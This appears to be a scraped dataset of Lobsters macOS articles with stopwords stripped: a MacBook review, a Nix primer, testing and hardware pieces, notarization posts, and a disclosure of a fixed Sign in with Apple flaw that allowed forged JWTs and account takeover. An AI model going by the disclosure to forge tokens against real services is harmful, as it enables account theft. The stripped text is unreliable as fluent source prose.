desktop notification support airdrop infrequently would use send thing ipad found suitable solution yet really issue work fine anything think better work switching linux home life suddenly present problem work cognitive overhead alternating different keyboard shortcut different o seem appealing along fact knew miss workaround use virtual machine via vmware fusion work surprisingly well little well feel almost native work machine mbp core ram capable overall always compromise whether firefox performance lack hw video decoding browser tweak thing overall mostly positive experience switch admit lot issue came across making worth really missed osx much fact probably sealed decision go apple next time round hardware excellent getting linux running macbook model sound like exercise sadness might end road apple laptop house
62,Lobsters,mac,Apple macOS,"Seven years later, I bought a new Macbook. For the first time, I don't love it",https://cfenollosa.com/blog/seven-years-later-i-bought-a-new-macbook-for-the-first-time-i-dont-love-it.html,seven year later bought new macbook first time nt love,point old computer became unusable due macos hardware issue point computer net win air webcam nokia trackpad point large trackpad singlehandedly ruin using experience working laptop keyboard remapped dual ctrlescape year ago karabiner bettertouchtool touchbar major bettertouchtool port due current battery life turbo boost switcher pro screen ibm performance build quality one thousand papercuts keyboard indeed praise worthy conclusion point first time since using mac love machine going back pro mean wrote apple fed overwhelmingly nonpro user data pro machine consequence decision nt serve pro user anymore rather general public point apple need continue coursecorrecting design priority power user optimistic future alternative improved since last time used point despite flaw macos o best balance convenience productive work combined iphone make unbeatable user experience apple hardware,june carlos fenollosa macbook air best computer ever owned wish always apple nothing update cpu screen touching nothing else afraid day upgrading laptop would come came air working flawlessly unbearably slow load let dig bit deeper problem result using old hardware video conferencing high stress like running multiple vms system would miss key press mouse click saying system laggy expected rather would type word macbook system would register mok example would start dragging event mouseup never registered mousemove continued working ended flailing icon around screen moving window unexpected place mostly macos fault contemporary similar spec running linux nt suffer issue look computer user perfectly understand old computer slow point freezing losing random input event serious bug modern multitasking system point old computer became unusable due macos hardware issue mentioned holding purchase due terrible product lineup apple held apple atoned thing changed since prefer smaller footprint decided would buy updated next macbook pro gb ram tb ssd ca nt bring love like loved air let explain maybe bring fresh perspective reviewer evaluate lineup version mind random person reviewer chance even touch mac since conditioned towards positive judgement previous generation much worse course new one better true test compare best laptop ever made air pro point computer net win air let explain reason webcam see webcam reviewed afterthought piece cover first feel like apple mocking u including worst possible webcam expensive laptop traditionally nonissue people however due working home topic become prominent case even pandemic used video conference every day nowadays spend day front webcam infuriates camera quality air noticeably better could nt use least part modern one see really feel like ripoff apple laughing u macbook pro webcam look horrible believe due truly face reasonable quality picture air reference front facing camera iphone se angle lighting condition second reference picture taken vga camera nokia look like would paid extra money better webcam macbook trackpad mechanism tracking excellent trackpad large palm rejection algoritm good enough point large trackpad singlehandedly ruin using experience working laptop constantly moving cursor accidentally situation annoying especially touch typist finger always hjkl thumb spacebar make thumb knuckle constantly brush trackpad activate really really need fix found unconsciously raising palm placing different angle may lead rsi suffered past problem apple created imperfect palm rejection algorithm issue unless irrationally enlarge trackpad much extends area palm touch typist typically rest video nobody us trackpad like worth antagonize touch typist order able move cursor tiny corner would accept tradeoff trackpad pencilcompatible could use sort handwriting tablet would actually great another annoying side effect large laptop lap sometimes clothes accidentally brush trackpad software register spurious movement prevents gesture happening think finger summary big reason turn annoyance benefit trackpad offer bad user experience also ruin would paid extra money smaller trackpad macbook keyboard keyboard good one better keyswitch mechanism fantastic layout perfect probably best keyboard laptop personally mind escape key shenanigan remapped dual ctrlescape year ago recommend touch id nice even though proficient typing password big deal face id would much convenient envy window hello user unfortunately large trackpad torpedo typing experience writing macbook pro worse air keep searching tool disables trackpad input within x miliseconds key press disables area trackpad luck neither karabiner bettertouchtool touchbar read mostly negative feedback determined drill like know bit contrarian use tool customize much awesome perapplication custom function layer unfortunately critic right antifeature gave honest try swear bad though could better bit effort understand regular user probably find useful cute ironically feature present pro laptop meant nonpro user slow typist people nt know regular keyboard shortcut said would mind probably would even like nt three major drawback first foremost distracting point first thing search completely turn default offer typing suggestion yes typing trying concentrate something field vision constantly flashing word nt mean type derailing train thought easy fix make wonder apple product manager thinking secondly placed way resting finger top keyboard trigger accidental key press retrain hand placement habit touchbarkeyboardtrackpad combo forcing many people learn place hand unnatural position accommodate poorly designed peripheral however apple could mitigated implementing pressure sensor make difficult generate involuntary key press would enough distinguish brush tap finally also ironic contradiction previous point due lack feedback sometimes sure whether successfully pressed touchbar key experience unjustifiable large number time press twice press deliberately activate key want redeeming feature though stated determined make bearable even slightly useful heavily modifying suggest go system preference keyboard use expanded control strip customize touchbar button remove key nt use add others consider paying bettertouchtool even customization option window go shortcut tab select function key left allows use function key default apps useful terminal pro apps like pycharm get third irony make touchbar pro feature useful pro apps best setup make behave like normal function key finally registering accidental key press leave empty space touchbar let finger rest safely retrain hand rest somewhere else ridiculous hey better getting brightness suddenly dimming zero accidentaly leave empty space touchbar area used rest finger would paid extra money touchbar macbook port another muchdebated feature resigned accept new era usbc research online bought best usbc hub along new dongle nt mind dongle already using air like swim money need blow proportion well wo nt point finger review site best hub going back amazon write line peripheral disconnect randomly plus get electric arc noise disconnect hub cable nt know even possible usbc situation terrible newly bought peripheral still come usba cable regarding hub took year find reliable hub air keep trying wish luck magsafe even though really liked nt miss much expected miss charging light though reason integrated official cable like xps people say charging via usbc actually better due standardization device nt know periperals people use iphone airpods charge via lightning apple watch charge via puck minor peripheral like camera external battery charge via microusb carry amount cable swapped magsafe cable charger usbc cable charger another poorly thought decision headphone jack wrong side population righthanded usually notebook mouse stuff right laptop headphone cable get way port left close user far away gain extra centimeter cable way including extension cord unacceptable cord convenience increase safety way earth grounding laptop without rubbing finger surface computer generates weird vibration due current always recommended mac user use charger extension cable even nt need extra length would paid extra money purchase appleguaranteed proper usbc hub alternatively would paid extra money machine couple usba port keep using trusty old hub would paid extra money extension cord come included laptop loss word enough paying extra money thing apple broke purpose battery life hour apps closed except safari browsing lightly occasional video brightness literal minimum brightness level realistic night time normally lit environment need set brightness level around great air new easily got hour light browsing course running catalina come push laptop bit docker container pycharm running google chrome doc opened brightness near maximum get around hour comparison figure reasonable overall bad expected wait low power mode mac favor install turbo boost switcher pro screen coming never used retina screen computer macbook pro impressed since nt edit photo video professionally appreciate crisp text rest feature lost devalue opinion screen brightness noticeable real test air reason screen seem equally bright used direct daylight new retina technology come drawback though first impossible get terminal screen without antialiasing favorite font ibm unreadable anti aliased real shame using since prefer nonantialiased font terminal additionally many picture website appear blurry retinaoptimized happens old application display crappy icon improperly proportioned layout apple fault affect user experience finally bezel tiny like xps acceptable nt mind summarize really like screen like everything else machine net gain win lose performance reason switch old laptop mbp delivers allows perform task painful old computer everything approximately three time faster really wow experience like upgrading computer much add modern computer fast build quality legendary usual nitpick minor issue like apple make palm rest area edge bit le sharp typing time get pressure mark wrist painful definitely discomforting likewise typing lap especially wearing sport short summer like right chassis leaf mark leg near hinge area could reduced blunting edge one thousand papercuts term software apple also need get stuff together catalina meh terrible many annoyance mail keep opening video conference sharing screen remind close mail video conference nt people read inbox ridiculous bug fixed yet remember apple mocked microsoft random alert window would steal focus typing worse profile picture appears squished login screen way fix proportion correctly displayed icloud setting window sometimes resuming sleep laptop nt detect keyboard assure keyboard indeed note dock still default one happened minute setting computer first time chance install software change setting get constant alert reenter password internet account password correct apple service need differentiate timeout rejected password maybe retry couple time prompting critical software used nt run anymore look alternative includes safari breaking extension important prepared worth mentioning praise worthy thing apple really well nt fit category photosapp solved photo problem great person photo library going back picture great grandparent thank apple continuity feature adding experience outstanding go icloud iphone mac thing magical fan thermal configuration well crafted laptop run totally silent fan kick system cool quickly go back silent speaker crisp nice bass nt sound like tin like laptop including air conclusion computer bittersweet happy finally perform task severely limited previous laptop nothing design product due fact internals modern maybe loving work tool privilege computer nerd taxi driver love car baristas love coffee machine gardener love leaf blower surgeon love scalpel yes always loved computer would nt developer spend least eight hour day touching looking silicon partner earn daily bread thanks chose computer carefully consideration mind scrupulous evaluating disappointing essential tool come many tradeoff even though review exhaustive nt get wrong annoyance minor except one dealbreaker typing experience written review laptop keyboard continuous annoyance look another irony apple suffered much fix keyboard yet still ruined comically large trackpad forest tree point first time since using mac love machine going back pro mean apple engineer know target audience machine laptop designed casual user pro user regular user enjoy large trackpads touch bar spend day scrolling twitter typing short sentence know nt get way typing essay source code inputting photoshop keyboard shortcut pro user wrote however last three five year everybody seemed buy mac even friend mine swore would never finally caved advice nonnerd friend recommend mbps make sense market saturated ultraportables window laptop break every couple year mac great investment even resell five year price essentially renting half price happened right pro using macbook pro professional tool anymore consumer product apple collect usage analytics machine suppose make informed decision like removing le used port increasing storage iphones long time apple fed overwhelmingly nonpro user data pro machine consequence decision nt serve pro user anymore rather general public final irony apple us pro product marketing synonymous expensive tier believing lie success consumer product fogging understanding real pro need nt need touchbar disable pro apps nt need large trackpad get way typing need diverse port connect peripheral nt work well adapter need better webcam increase productivity enhance communication team need include effin extension cable current chassis need splash inbox content front guest sharing screen need method extend battery long possible come back day point apple need continue coursecorrecting design priority power user optimistic future made peace fact unlike previous computer one last year important factor purchase decision know mac bridging gap best lineup apple history come future bought necessity desire laptop arm cpu awaiting new hardware eagerly hoping apple keep rolling back antifeatures like butterfly keyboard maybe touchbar massive trackpad next surely laggy unresponsive o fixed alternative conclude want anticipate question people mind nt buy another laptop well prior purchase spent two month trying use linux setup fulltime close successful critical software job real alternative inconvenient regarding window eye xps carbon extremely similar macbook regard spent time checking window improved since last time used turn nt hate window much irrational surely people prefer feel way mac point despite flaw macos o best balance convenience productive work combined iphone make unbeatable user experience decided purchasing new mac least undesirable option still stand decision actively try fix broken trackpad increase customer satisfaction even still far away perfect loving experience air tag apple hardware
63,Lobsters,mac,Apple macOS,A Nix terminology primer by a newcomer,https://stephank.nl/p/2020-06-01-a-nix-primer-by-a-newcomer.html,nix terminology primer newcomer,nix official nix manual portier portierpublicinfra nixdarwin homemanager nix nix expression language nix expression attribute set derivation derivation builder fixedoutput derivation nix store also specific build precisely binary cache profile garbage collection channel nixpath nixpkgs overlay flake way nixdaemon nixos complete module activation nixdarwin homemanager standalone nix installation closing word easy amazing really hyped,maybe nt paying attention last year seems increase discussion around nix package manager also got finally try happy result even road little bumpy nt believe one mention documentation lacking little finish personally find lot nix allows two people thing way top official nix manual may try teach whole bunch thing wo nt using practice post attempt help smooth road bit try go nix terminology bottomup hopefully explain concept way much perspective contain opinion well little bit accomplished nix far setup nixos server hosting publicly accessible application portier project includes packaging rust python tool application configuration public found portierpublicinfra repository github setup macbook using nixdarwin homemanager replacing private dotfiles repo vimplug ohmyzsh almost everything homebrew still use homebrewcask still consider quite new keep mind probably mistake inaccuracy let get started nix nix often called package manager like package manager intended purpose manage installation tool application need find nix stretch definition bit used smaller larger task managing package installation part nix nix expression language set commandline tool nix expression language functional programming language lazy evaluation language used describe package build contains unique language construct make work also important know value language immutable language allow sideeffects code function pure personally argue working nix user interesting thing nix expression language package management refer nix language nix expression literally expression nix language term often used passing nix language expression toplevel language construct opposed example statement javascript python definition c friend term nix expression also sometimes used describe file containing nix suffix notably nix file referred library module often import builtin function used load example import nix expression foonix attribute set set namevalue pair similar dictionary python object javascript foo barbaz incredibly basic concept felt like needed highlight term specifically easily missed skimming ahead manual derivation special type value nix language describe essentially build step derivation subtype attribute set created using language builtin function derivation though often end using wrapper derivation take input produce output lazy evaluation derivation actually built one output evaluated nix language course also cause input evaluated may turn derivation package depend eachother nix common scenario packaging nix derivation single output called default use installation prefix whatever tool packaging executables would end outbin example also important note derivation used build package anything really like configuration file example derivation really core concept make nix tick derivation builder one required input derivation builder responsible actually producing output often simply shell script one simplest possible derivation derivation name helloworld system output builder pkgsbash binbash args c echo hello world builder assigned output path filesystem one output declared path output made available environment variable builder create directory may also write single file fixedoutput derivation derivation output known ahead time via content hash one basic step packaging download source code whatever tool packaging nix step derivation created wrapper function like fetchurl simply fetching url without verification bad idea content url may change breaking immutable build nix try achieve mention package manager nt verify downloads would huge security risk nix solves adding content hash fixedoutput refers look like pkgsfetchurl url http call function fetchurl attribute set argument return value fetchurl derivation nix store filesystem storage derivation output nixstore established derivation produce output filesystem output also immutable value nix language value simply string path format nixstore hash name nix determines path input evaluated builder even start running fact variable builder script already final nixstore path hash path content hash input evaluated mean hash encompasses dependency version used specific build dependency change even compiler used build package minor version bump example whenever possible package refer dependency using full nixstore path nix actually go length patch various part upstream tool apply everywhere example see shared library running something like ldd bash nixos system remember builder example builder pkgsbash binbash evaluated also refers specific build bash somewhere nixstore match immutable value language immutable file nixstore allows nix precisely describe specific build package even complete system encompassing dependency also naturally provides reproducable build binary cache cache derivation output comparable binary package package manager simply host prebuilt derivation output nix download copy straight nixstore especially useful large expensive build package like glibc gcc find probably packaged officially binary available profile set package make available user used normally shell also sometimes called user environment profile managed nixenv tool included nix many nix user opt different solution like nixos nixdarwin homemanager allow write desired package declaratively configuration file chain symlinks place user homenixprofile nixvarnixprofilesperuser userprofile nixvarnixprofilesperuser nixstore hash userenvironment user homenixprofilebin shell path final userenvironment directory contains combined directory tree package installed numbered symlink encodes generation way easy switch back previous state simply switching symlink nixenv g num similarly nixos find system profile package installed available systemwide user garbage collection process removing unused file nix abbreviated gc keep using nix continue building file store continue building old generation profile need cleaned via nixstore gc wrapper nixcollectgarbage automated simply running one interval usually daily process actually quite simple nix scan symlinks nixvarnix deletes store item longer reachable symlinks directory contains profile subdirectory also gcroots subdirectory used tool built top nix symlinks called garbage collection root gc root channel collection nix expression fetched external source comparable package registry repository package manager nix channel managed nixchannel tool included nix tool simply downloads extract tarballs must contain defaultnix imported often find channel pulled directly github repository using special github url download tarball master branch even official nixpkgs channel used way though standard nix installation use nixosorg mirror nixchannel tool reuses profile functionality chain symlinks user homenixdefexprchannels nixvarnixprofilesperuser userchannels nixvarnixprofilesperuser nixstore hash userenvironment final userenvironment directory find symlinks channel name pointing extracted content nixpath like path shell nix language import semicolon seperated list search path default nixpath contains least nixvarnixprofilesperuserrootchannels mean channel registered root available everyone way root user responsible managing main copy nixpkgs system element nixpath used resolve angular import like import nixpkgs directory nixpath searched order nixpkgs first hit used nixpath also allows element describe single import name directly nixpath nixpkgspathtonixpkgs used purpose course often used system like nixos encode location configuration nixpath nixosconfigetcnixosconfigurationnix nixvarnixprofilesperuserrootchannels nixpkgs official collection nix package fresh nix installation channel setup nixpkgs usually root user account manually imported get factory function take attribute set containing optional configuration configuration used switch onoff nonfree package example return value function attribute set containing available package lazy evaluation make cheap simple manual import look like import nixpkgs often nt import nixpkgs manually configured elsewhere look argument variable called pkgs contain alreadyconfigured nixpkgs nixpkgs also function standard library nix language nix language builtin function nixpkgs provides many useful extension lib attribute overlay flake method customize nixpkgs overlay currently used method flake new implementation still experimental time writing general allow adding new package customizing existing package set overlay use part configuration provided nixpkgs factory function way set nixdaemon daemon process manages nix multple user sandbox build daemon run root actually evaluate nix language code however perform actual derivation build even though build sandboxed usually select group user allowed use nix system nixos already mentioned several time nixos complete linux distribution top nix nixos take configurationnix us derivation generate real configuration complete linux system oversimplified seen large build step etc build step automatically pull package need realize system configuration like dependency processing configurationnix best seen adding entire new layer top nix package build introduces new concept new layer use modify lower layer package building nixos system large chunk etc symlinks also chain etcbashrc etcstaticbashrc nixstore hash etcetcbashrc visible chain skip step build nixstore actually part system profile us profile underneath generation rollback nixosrebuild switch rollback nixos also manage package individual user system work bit like nixenv profile live separately etcprofiles module nix expression modify extend nixos system configuration crucially package nixpkgs build software nt include systemd unit file module come module nix expression loaded processing nixos configurationnix provide new option standard module preloaded nixos often enable option activate custom module loaded using import list configuration languagelevel import enabled module may modify various part nixos configuration alongside configurationnix creating etc file adding new systemd unit often pull package consequence example nginx module pull nginx package creates necessary systemd service unit many standard nixos module actually live repository nixpkgs find homemanager nixdarwin discussed later also use module concept code live nixpkgs activation additional step perform switching new configuration nixos far discussed buildtime concept nixos layer top nix also add runtime element service need startedstopped example nixos us term activation additional runtime stuff nixosrebuild switch switching configuration one part script called literally activate found toplevel directory system profile script composed nixos various module enabled systemactivationscripts configuration option quick way find script use runcurrentsystem symlink also point current system profile generation actually startingstopping service handled perl code part nixos tooling though nixdarwin macos counterpart nixos though obviously complete installable operating system structure nixdarwin similar nixos us darwinconfigurationnix composed module us system profile activation step darwinrebuild switch module nixdarwin allow selectively take part macos configuration add new launchd service course install package note get running nixdarwin first need multiuser install described manual nixdarwin afterwards take management installation work far better though probably stumble setting nix macos quick tip figure setup apfs volume nix turn spotlight indexing volume heed warning installer file etc nt touch require special attention homemanager like nixos nixdarwin setting one user home directory structure similar nixos us homenix composed module us homemanager profile activation step homemanager switch module homemanager allow selectively take configuration tool like git zsh vim firefox name list long homemanager also setup systemd user service course install package homemanager support linux macos though macos support complete time writing notably many module start user service nt yet know launchd really useful singleuser system embed homemanager configuration inside nixos nixdarwin configuration also combine activation meaning nt touch homemanager commandline tool standalone nix installation wanted section talk nonnixos installation method mentioned official nix manual thing wonky macos go move nixdarwin believe linux distribution may supported method one option singleuser nix install mean nixdaemon nix owned root regular user already recommended manual nix ca nt sandbox build setup option multiuser install run nixdaemon properly root way installer bit oneoff though least macos installed actually upgrading nix becomes manual confusing process closing word bunch stuff nt touched like nixops remote build mainly nt used yet wonder ever hopefully also mean list comfortable subset thing interesting new user personally found really powerful using nixos individual server custom application never able figure packaging debian nixos packaging comparatively easy despite language learning curve bypassing packaging debian always meant left wondering restart service automatically unattended upgrade roll new version important dependency like openssl nodejs also systemd integration nixos amazing make custom chroots breeze think biggest hurdle nix really macos installation process maybe problem exists trying nix linux distribution feel like great firsttime experience outside nixos may really help build interest specifically think nixdarwin combined installer standalone install method written advanced another gripe peruser channel management fine default tailored system one user feel like majority installation specifically moved nixpkgs channel user mac instead root switch root upgrade nix nixpkgs really annoying nt sudo darwinrebuild switch ever asks password still sincerely hope none turned away nix hyped far package system management go futuristic time spent learning nix time spent well opinion
64,Lobsters,mac,Apple macOS,Zero-day in Sign in with Apple,https://bhavukjain1.github.io/blog/2020/05/30/zeroday-signin-with-apple/,zeroday sign apple,full account takeover user account technical detail email protected email protected bug,say email id need takeover account favorite website app sound scary right bug sign apple allowed month april found zeroday sign apple affected thirdparty application using implement additional security measure bug could resulted full account takeover user account third party application irrespective victim valid apple id vulnerability paid apple apple security bounty program technical detail sign apple work similarly oauth two possible way authenticate user either using jwt json web token code generated apple server code used generate jwt diagram represents jwt creation validation work step authorizing apple give option user either share apple email id party app user decides hide email id apple generates userspecific apple relay email id depending upon user selection successful authorization apple creates jwt contains email id used party app login user decoded jwt payload look like i http appleidapplecom aud comxxxxweblogin exp iat sub xxxxxxxxxxxxx chash email email protected email protected emailverified true authtime noncesupported true bug found could request jwts email id apple signature token verified using apple public key showed valid mean attacker could forge jwt linking email id gaining access victim account sample request step passing email apple generated valid jwt idtoken particular email id sample response authorization idtoken grantcode scope name email authorizeddata userid xxxxxxxxxxxx consentrequired false impact vulnerability quite critical could allowed full account takeover lot developer integrated sign apple since mandatory application support social logins name use sign apple dropbox spotify airbnb giphy acquired facebook application tested could vulnerable full account takeover security measure place verifying user apple also investigation log determined misuse account compromise due vulnerability huge thanks apple security team thanks read see next article
65,Lobsters,mac,Apple macOS,MPWTest: Reducing Test Friction by Going Beyond the xUnit Model,https://blog.metaobject.com/2020/05/mpwtest-reducing-test-friction-by-going.html,mpwtest reducing test friction going beyond xunit model,mpwtest setup mpwtest code codesmell use courage caveat outlook,popular demand quick rundown mpwtest simplest testing framework could possibly work personal unit testing framework make tdd fast fun frictionless created mpwtest bitten tdd bug definitely want write software without tdd ever could help long xctest even precursor sentestkit best parallel development certainly nt aware bit different difference make sufficiently better much prefer xunit variant worked junit sunit xctest vastly better tdd introduce significant amount overhead friction make testing experience much cumbersome need least partly explains antipathy see towards unit testing developer attitude see testing like eating vegetable know supposed good grudgingly really rather annoying benefit something know intellectually mpwtest tdd also still intellectually good also viscerally fun le like vegetable like tasty snack except snack yummy also healthy help stay flow get thing done let change code quickly safely key agile work setup first need build testlogger binary mpwtest project put mine usrlocalbin forget put anywhere like adjust path follows next add script build phase framework project mpwtest currently test framework testerusrlocalbintestlogger framework targetbuilddir fullproductname f tester tester framework else echo warning tester framework found test run fi bottom build phase pane project look something roughly like following separate test bundle extra target nada may seem big deal single target start getting framework additional test target really start add add decisionpoint really create additional test bundle project maybe repurpose existing one code class tested add nsarray testselectors method returning list test runtest method execute example json parser writing testselectors return testparsejsonstring testparsesimplejsondict testparsesimplejsonarray testparseliterals testparsenumbers testparseglossarytodict testdictafternumber testemptyelements teststringescapes testunicodeescapes testcommonstrings testspacebeforecolon could also determine name automagically prefer explicit list part specification test run otherwise easy lose test editing mistake none wiser implement test example testunicodeescapes void testunicodeescapes mpwmasonparser parser mpwmasonparser parser nsdata json self frameworkresource unicodeescapes category json nsarray array parser parseddata json nsstring first array intexpect first length length parsed unicode escaped string intexpect first expected value idexpect array n second newline yes mostly old code macro er expect intexpect expects integer equality scalar honest idexpect expects object equality also convenience nil nil true false well specialized one float set acceptable range theory put method anywhere tend place testing category bottom file end import debugmacrosh implementation mpwmasonparser testing debugmacrosh header various expcect macro header dependency code need link anything even separate test bundle separate test class hierarchy really simplifies thing lot first question find test particular class bottom file scroll class test scroll find incredibly useful test serve specification documentation example code class also need maintain parallel class hierarchy widely regarded fairly serious codesmell obvious reason need keep hierarchy sync along problem get sync etc use setup build project test run automatically part build test failure reported xcode would expect step tend add name test testselectors hit build ensure test red xcode build add empty test method hit build ensure test green either add actual expect test expecttrue false impelemented placeholder may seem like lot step really mostly letting xcode check thing edits need done anyhow hitting cmdb couple time editing nt hurt fact test run part every build build without running test give completely different level confidence code translates courage running test time also splendid motivation keep test green test fail build fails build fails run program last least running test every build also strong motivation keep test fast testing nt separate activity integral part development process writing code compiling caveat drawback approach one pretty xcode unit test integration nt work done apple already left platform idea behind focused making integrated solution noted displaying test failure error jumping line failed testexpectation work hook mechanism xcode us get information compiler simply output line number error message stdout tool format output way work wth xcode end enojoy blinkenlights xcode unit test integration able run test individually simple mouseclick bling really reinforces idea test separate entity test always run always green always fast nt need even want ui ui distraction test fade background another slightly annoying issue debugging test run part build test failure build failure block executables running however xcode debugs executables ca nt actually get debuggable run session nt use debugger much failure tdd usually manifest test failure rather something need debugger track nt much problem past would revert command line example lldb testlogger mpwfoundation debug foundation framework ca nt actually run framewework thought receently find set executable parameter target build scheme set testlogger debug framework heart content leaving problem xcode actually letting run executable due build failing far know facility debugging build phase workaround temporarily disabling test build phase accomplished misusing run script installing flag issue nt actually significant somewhat jarring might expect experience buttery smooth rest time course want pure test class create class test furthermore class actually asked test fixture object test default return class object also return instance setup teardown method way expect xunit code enumerate probe class system order find test also interesting straightforward need updated time time class system like probed outlook obviously happy people try mpwtest find useful find useful provide good feedback currently specific plan swift support objectivec compatible class probably work rest language probably nt dynamic enough support kind transparent integration certainly without compiler work currently investigating swift interop generally longer restricted cobjectivec might possible almost certainly use lesson learned create linguistically integrated testing objectivesmalltalk many aspect objectivesmalltalk gap bridged supersmooth actually large another takeaway unit testing really really simple fact asked kent beck response everyone build go build wonderful thing
66,Lobsters,mac,Apple macOS,The Power Macintosh G3 All-in-One: Function Over Form,https://www.macstories.net/mac/the-power-macintosh-g3-all-in-one/,power macintosh allinone function form,saved apple radically changed consumer technology landscape hardware still available apple website software including o x lack support machine hardware volume button check video quinn nelson snazzy lab youtube shortlived five flavor imacs,year mark anniversary imac allinone saved apple radically changed consumer technology landscape nerd probably remembers seeing one colorful curvy imacs school growing friendly design relatively low cost mac least made staple education year certainly saw used fair share middle high school also got experience imac weird older sibling power macintosh allinone yeah one look kind like big tooth power macintosh allinone quickly earned nickname molar mac thanks design mostly beige machine translucent holepunched plastic across top drape back people said design almost sensual leave decide molar mac educationonly machine unlike emac year later never crossed consumer market focus single market meant hardware designed specific need mind true case function form hardware display crt front machine home much screen every model came cd drive floppy drive highend model coming zip drive entrylevel model cost came mhz processor gb hard drive full spec still available apple website nicer mhz model cost several hundred dollar came coveted zip drive front panel also home two headphone jack carried imac allinone either side machine let two student sit front computer listening medium comfortably plenty slack wired headphone clever around back functionoverform mantra come majority computer installed tray easily removed machine removal four screw tray house logic board ram hard drive zip drive floppy drive pci card including default ethernet card pci slot meants thing like usb could added machine road making computer useful imac took tray granted access anything computer could serviced quickly without need discharge crt meant inschool technician could repair upgrade component machine big win eye education customer something true current mac one favorite design touch machine port plug recessed mean computer could pushed back wall desk accessory plugged without damaging cable clever feature come cost power macintosh allinone heaviest mac apple ever shipped clocking pound company storagefocused server product like xserve raid old network server weigh software going sale molar mac came macos box complete customizable platinum interface multithreaded finder muchimproved performance however machine vintage power macintosh allinone run mac o x jaguar capped version small issue including o x lack support machine hardware volume button software could augmented handle task reach mac era allinone could outfitted personality card card added multimedia capability machine video input output complete ability record incoming video good look machine check video quinn nelson snazzy lab youtube video whoop shortlived molar mac may looked little unusual crafted apple education customer mind ton people memory machine well sale le year introduced april apple stopped selling january five flavor imacs made market apple replacing allinone imac brought tradeoff imac cheaper smaller ditched apple legacy port floppy drive two thing school built infrastructure around however apple saw imac future usual pushed vision onto customer thankfully right
67,Lobsters,mac,Apple macOS,Catalina is checking notarization of unsigned executables,https://lapcatsoftware.com/articles/catalina-executables.html,catalina checking notarization unsigned executables,catalina checking notarization unsigned executables macos slow design hacker news little snitch addendum may intriguing comment another intriguing comment,catalina checking notarization unsigned executables followup allan odgaard excellent article macos slow design want talk specifically first section spawning new process widespread misunderstanding odgaard provides simple test show first run executable delayed catalina check executable notarization status online occurs even shell script code signed echo binshnecho hello tmptestsh chmod ax tmptestsh time tmptestsh time tmptestsh number people including reproduced issue however number people claim ca nt reproduce rather skeptical claim found case people misinterpreting test ca nt expect experience obviously long delay length delay depends crucially condition speed network connection well vicinity apple server chinese commenter hacker news posted result second v millisecond vpn second v millisecond nonvpn without online check script ought finish executing within millisecond even first test result around millisecond still many time longer expected people try explain away delay eg would put v m filesystem caching hand waving nt stand scrutiny also important remember catalina cache result online check test multiple time could give misleading result testing easiest way trigger new online check modify content script simply created script textedit saved kept textedit open easy editing saving verify online check taking packet trace first run clearly online check subsequent run unmodified script online check execution much faster turn mac internet connection see first run script much faster yet first run without internet still slower subsequent run still trying make online check failing caching result catalina trying check notarization executable evidence strongly indicates yes packet trace look exactly like packet trace normal app notarization check always domain apiapplecloudkitcom search catalina file system result domain found systemlibraryprivateframeworksworkflowkitframework systemiossupportsystemlibraryprivateframeworksworkflowkitframework related shortcut usrlibexecremindd related reminder usrlibexecsyspolicyd looking process responsible checking notarization fact one place http publicrecordslookup syspolicyd contact domain url objectivec format string yes syspolicyd still written objectivec majority macos also find log message syspolicyd performing legacy notarization check unsigned code sure say legacy could speculate would distract main point case nt know could plausibly called anything notarization check single online api used regular apps nonapp executables way block macos notarization check without turning internet connection installing little snitch setting rule deny outgoing connection syspolicyd highly recommend little snitch consider absolutely essential software mac contrast catalina macos mojave online check whatsoever shell script also verified packet trace even download file web adding quarantine extended attribute still notarization check first run shell script mojave fast subsequent run script online delay introduced mojave back catalina started wondering kind executable compiled commandline tool script apps either created simple hello world project xcode changed build setting tool code signed xcode ran tool first time online notarization check bit surprising looked xcode build transcript though found explanation final phase build linking phase register execution policy exception xcode called builtinregisterexecutionpolicyexception tool gave tool permission execute mac without getting checked since xcode messing test decided forgo xcode instead directly compiling commandline executable using clang nt code sign compiled executable ran first time notarization check course notarization check subsequent run thus catalina seems checking notarization every unsigned executable whether shell script compiled macho file next test decided compile another tool time perform ad hoc code signing codesign sign identity ad hoc signed executable signed mac nt require signing certificate ran ad hoc signed tool first time also triggered notarization check like unsigned case one scenario nt test running compiled commandline tool signed apple developer certificate easy xcode easy without xcode impossible figure appropriate argument codesign invocation honest testing nt feel like additional work someone else try please returning original article allan odgaard asks apple sending source custom script server answer two independent way verifying first look disassembly otool tv usrlibexecsyspolicyd see exactly work second look packet trace example create large script compare size script number byte data sent apple nt enough byte fit large script nt many byte notarization check point supposed fast networkly possible code signing notarization use secure hash full file content hope discussion useful clarification unfortunately ca nt explain catalina running notarization check executables mystery really apple explain got lot explaining addendum may today came across intriguing comment apple xcode engineer way engineer blocked bird site unknown unknown except generalized ripping xcode guess xcode ui able bypass gatekeeper check thing build developer tool pane system prefs security privacy power drag anything list like grant privilege xcodebuild inherited child process well point avoid malware packing bit xcode silently compiling target machine thus bypassing system security policy may indicate apple motivation adding notarization check script standalone executables one major problem though information documented anywhere knowledge first ever heard professional mac developer allan odgaard flailing dark trying cope mysterious system behavior hacker news comment documentation apple let leave another intriguing comment ponder making speed burying lede privacy userfreedom perspective horrifying nt think apple theoretically centralized database every mac user ever used youtubedl tor truecrypt
68,Lobsters,mac,Apple macOS,macOS 10.15: Slow by Design,https://sigpipe.macromates.com/2020/macos-catalina-slow-by-design/,macos slow design,macos slow design episode atp disabling system integrity protection spawning new process update user china report delay second privileged file system location keychain access documentation application launch delay final word update comment michael tsai blog,macos slow design episode atp marco arment john siracusa described noticeable delay stall upgrading macos struggling issue found several system operation cause delay detail one way solve delay disable internet connection tough medicine notice delay try hour verify indeed issue resolved disabling internet connectivity another way reduce delay disabling system integrity protection say reduce still get delay even sip disabled system overall feel much faster would strongly recommend anyone think system sluggish spawning new process apple introduced notarization setting aside inconvenience brings u developer also result degraded user experience first time user run new executable apple delay execution waiting reply server check take close second file downloaded internet launch via finder everything even write one line shell script run terminal get delay test running following two line terminal echo binshnecho hello tmptestsh chmod ax tmptestsh time tmptestsh time tmptestsh update user developer tool category security privacy preference pane terminal added category able reproduce delay though enough confirmation establish delay real one user china report delay second using vpn honestly downright baffling apple sending source custom script server stance privacy think likely sending checksum checksum system locally notarization check result cached second invocation fast developer may update script binary regularly trigger new check appears caching based inode updateinplace save may avoid triggering new check may workflow involve dynamically creating executing script performance hinge upon responsiveness apple server worst delay seen particular issue around second episode seemed cache result repeated launch would still delay issue reported apple assigned apple however responded design hence title post privileged file system location apple file system location require user permission access example desktop document downloads surprisingly though obtaining display name icon one folder trigger apple code verify client allowed access location done sending message sandboxd process sends message tccd call 